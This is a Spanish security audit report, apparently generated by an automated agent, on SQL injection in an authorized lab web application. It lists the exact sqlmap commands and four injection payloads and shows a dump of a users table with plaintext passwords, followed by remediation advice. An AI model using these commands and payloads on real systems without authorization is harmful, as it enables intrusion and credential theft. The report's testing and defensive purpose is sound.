# Informe de Auditoría de Seguridad — SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-25T12:04:29Z  
**Modelo:** sonnet4.6  
**Clasificación:** CONFIDENCIAL — Entorno de laboratorio autorizado

---

## 1. Resumen Ejecutivo

Se ha realizado un análisis dinámico de seguridad (DAST) sobre la aplicación web disponible en `http://web.dev.local:8083`. Se identificó y confirmó una vulnerabilidad crítica de **inyección SQL (SQLi)** en el parámetro GET `id`. La vulnerabilidad fue explotada con éxito, permitiendo la extracción completa de la base de datos de usuarios, incluyendo credenciales en texto plano.

**Severidad:** 🔴 CRÍTICA (CVSS v3: ~9.8)

---

## 2. Reconocimiento (Fase 1)

### Tecnología detectada
- **Servidor web:** Apache 2.4.65
- **Lenguaje:** PHP 8.1.33
- **Base de datos:** MySQL 5 (MariaDB fork)
- **SO del servidor:** Linux Debian

### Vectores de entrada identificados
| # | Tipo   | Endpoint                         | Parámetro | Método |
|---|--------|----------------------------------|-----------|--------|
| 1 | Formulario HTML | `http://web.dev.local:8083/` | `id`      | GET    |

La página presenta un formulario de búsqueda de usuarios por ID. El parámetro `id` se envía vía GET y es directamente interpolado en una consulta SQL sin sanitización.

---

## 3. Descubrimiento de Vulnerabilidades (Fase 2)

### Herramienta utilizada
`sqlmap 1.9.10#stable`

### Comando ejecutado
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --level=3 --risk=2
```

### Resultado
**Parámetro vulnerable confirmado:** `id` (GET)

sqlmap detectó **4 tipos de inyección SQL**:

| Tipo                  | Título                                                                                  |
|-----------------------|-----------------------------------------------------------------------------------------|
| Boolean-based blind   | AND boolean-based blind - WHERE or HAVING clause (subquery - comment)                  |
| Error-based           | MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)       |
| Time-based blind      | MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                     |
| UNION query           | Generic UNION query (NULL) - 2 columns                                                 |

### Payloads exactos detectados

**Boolean-based blind:**
```
id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit
```

**Error-based:**
```
id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit
```

**Time-based blind:**
```
id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE&Submit=Submit
```

**UNION query:**
```
id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -&Submit=Submit
```

---

## 4. Explotación Activa (Fase 3)

### Paso 4.1 — Enumeración de bases de datos

**Comando:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --current-user --dbs
```

**Resultados:**
- **Usuario actual de BD:** `root@%` ⚠️ (privilegios máximos)
- **Bases de datos disponibles:**
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `sqli_demo`
  - `sys`

### Paso 4.2 — Enumeración de tablas

**Comando:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch -D sqli_demo --tables
```

**Resultado:** Base de datos `sqli_demo` contiene la tabla `users`.

### Paso 4.3 — Volcado completo de datos

**Comando:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch -D sqli_demo -T users --dump
```

**Datos extraídos — Tabla `sqli_demo.users`:**

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **CRÍTICO:** Las contraseñas se almacenan en **texto plano** sin ningún tipo de hash o cifrado.

---

## 5. Impacto

| Riesgo                             | Descripción                                                                                  |
|------------------------------------|----------------------------------------------------------------------------------------------|
| Acceso no autorizado               | Un atacante puede autenticarse como cualquier usuario, incluyendo el administrador (`admin`) |
| Exposición masiva de datos         | 8 usuarios con credenciales en texto plano comprometidas                                     |
| Control total sobre la BD          | El usuario de BD es `root@%`, permitiendo operaciones DDL/DML y acceso a otras bases de datos |
| Escalada de privilegios potencial  | Acceso a tablas del sistema MySQL (`mysql.user`) con posibles hashes de BD                   |

---

## 6. Recomendaciones

1. **Usar consultas preparadas (Prepared Statements)** con parámetros enlazados en todas las consultas SQL.
2. **Usar un ORM** o capa de abstracción de base de datos que prevenga la concatenación directa de parámetros.
3. **Hashear contraseñas** usando algoritmos seguros como `bcrypt`, `argon2` o `scrypt`.
4. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación NO debe ser `root`. Crear un usuario con permisos limitados (solo SELECT/INSERT/UPDATE en la BD necesaria).
5. **Implementar WAF** (Web Application Firewall) como capa adicional de defensa.
6. **Validación y sanitización de entradas** en el lado del servidor.

---

## 7. Conclusión

La aplicación web `http://web.dev.local:8083` presenta una vulnerabilidad **crítica de SQL Injection** en el parámetro GET `id`. La vulnerabilidad fue confirmada y explotada con éxito mediante `sqlmap`, logrando la extracción completa de la tabla de usuarios con credenciales en texto plano. El impacto es máximo dado que el proceso de base de datos corre con el usuario `root` y las contraseñas no están hasheadas.

**Estado de la explotación:** ✅ ÉXITO — Datos de 8 usuarios extraídos con credenciales en texto plano.

---
*Informe generado automáticamente por Agente de Seguridad Ofensiva DAST*  
*Entorno de laboratorio autorizado — No distribuir*
